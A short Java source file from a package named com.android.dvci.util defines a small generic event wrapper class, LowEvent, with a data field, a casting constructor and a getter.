package com.android.dvci.util;

import java.io.Serializable;

/**
 * Created by zad on 03/03/15.
 */
public class LowEvent<T extends Serializable> extends LowEventMsg {
	public T data;
	public LowEvent(LowEventMsg p) {
		this.data = (T) p.data;
	}

	public T getData() {
		return data;
	}
}
